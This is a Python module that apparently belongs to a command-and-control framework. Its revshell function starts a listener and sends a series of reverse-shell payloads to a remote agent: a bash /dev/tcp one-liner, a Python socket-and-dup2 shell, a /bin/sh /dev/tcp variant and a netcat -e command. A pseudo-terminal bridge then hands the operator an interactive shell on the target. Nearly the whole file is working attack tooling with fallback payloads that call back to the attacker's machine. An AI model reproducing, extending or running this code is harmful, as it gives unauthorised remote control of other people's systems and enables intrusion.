import os
import socket
import pty
import select
import signal
import tty
import termios
import struct
import fcntl
import json
import time
from colorama import Fore, Style


def detect_ip():
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80))
        ip = s.getsockname()[0]
        s.close()
        return ip
    except Exception:
        return "127.0.0.1"


def get_free_port():
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.bind(("", 0))
    port = s.getsockname()[1]
    s.close()
    return port


def _set_winsize(fd, rows, cols):
    winsize = struct.pack("HHHH", rows, cols, 0, 0)
    fcntl.ioctl(fd, termios.TIOCSWINSZ, winsize)


def _terminal_size():
    try:
        import shutil
        return shutil.get_terminal_size()
    except Exception:
        return 80, 24


def _pty_bridge(conn, addr):
    print(f"{Fore.GREEN}[+] Reverse shell from {addr}{Style.RESET_ALL}")
    print(f"{Fore.YELLOW}[*] Real shell. Type 'exit' to return.{Style.RESET_ALL}")

    cols, rows = _terminal_size()

    pid, fd = pty.fork()
    if pid == 0:
        for fd2 in (0, 1, 2):
            try:
                os.close(fd2)
            except OSError:
                pass
        try:
            os.setsid()
        except OSError:
            pass
        os.environ["TERM"] = os.environ.get("TERM", "xterm-256color")
        os.execve("/bin/bash", ["/bin/bash"], os.environ)
        os._exit(1)

    old = termios.tcgetattr(0)
    try:
        tty.setraw(0)
        _set_winsize(fd, rows, cols)

        def _sigwinch(sig, frame):
            nonlocal cols, rows
            cols, rows = _terminal_size()
            _set_winsize(fd, rows, cols)

        signal.signal(signal.SIGWINCH, _sigwinch)
        conn.setblocking(True)

        while True:
            r, _, _ = select.select([conn, fd, 0], [], [])
            if conn in r:
                data = conn.recv(4096)
                if not data:
                    break
                os.write(fd, data)
            if fd in r:
                data = os.read(fd, 4096)
                if not data:
                    break
                conn.send(data)
            if 0 in r:
                data = os.read(0, 4096)
                if not data:
                    break
                conn.send(data)
    except (EOFError, BrokenPipeError, ConnectionResetError):
        pass
    except Exception as e:
        print(f"{Fore.RED}[!] Shell error: {e}{Style.RESET_ALL}")
    finally:
        termios.tcsetattr(0, termios.TCSADRAIN, old)
        try:
            os.close(fd)
        except OSError:
            pass
        try:
            conn.close()
        except OSError:
            pass
        try:
            os.kill(pid, signal.SIGKILL)
        except OSError:
            pass
        print(f"\n{Fore.GREEN}[+] Shell closed{Style.RESET_ALL}")


def _agent_exec(manager, agent_id, payload, label):
    tid = manager.send_task(agent_id, "shell", {"command": payload})
    if not tid:
        return False
    print(f"{Fore.CYAN}[*] {label}{Style.RESET_ALL}")
    return True


def revshell(manager, agent_id, c2_server):
    ip = detect_ip()
    port = get_free_port()

    print(f"{Fore.CYAN}[*] Listener on 0.0.0.0:{port}{Style.RESET_ALL}")
    print(f"{Fore.CYAN}[*] Agent target IP: {ip}:{port}{Style.RESET_ALL}")

    srv = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    srv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    srv.bind(("0.0.0.0", port))
    srv.listen(1)
    srv.settimeout(20)

    # Try bash /dev/tcp first
    bash_payload = f"bash -c 'bash -i &>/dev/tcp/{ip}/{port} 0>&1'"
    _agent_exec(manager, agent_id, bash_payload, "bash /dev/tcp payload sent")

    # Wait for connection with short timeout, then try Python fallback
    conn = None
    for attempt in range(4):
        try:
            conn, addr = srv.accept()
            break
        except socket.timeout:
            if attempt == 0:
                py_code = (
                    "import socket,subprocess,os;"
                    f's=socket.socket();s.connect(("{ip}",{port}));'
                    "os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);"
                    "subprocess.call([os.environ.get(\"SHELL\",\"/bin/sh\"),\"-i\"])"
                )
                py_payload = f"python3 -c \"{py_code}\""
                _agent_exec(manager, agent_id, py_payload, "Python fallback payload sent")
            elif attempt == 1:
                sh_payload = f"/bin/sh -i &>/dev/tcp/{ip}/{port} 0>&1"
                _agent_exec(manager, agent_id, sh_payload, "/bin/sh payload sent")
            elif attempt == 2:
                ncat_payload = f"nc -e /bin/sh {ip} {port}"
                _agent_exec(manager, agent_id, ncat_payload, "nc -e payload sent")

    srv.close()

    if not conn:
        print(f"{Fore.RED}[!] No connection after 20s{Style.RESET_ALL}")
        return

    _pty_bridge(conn, addr)
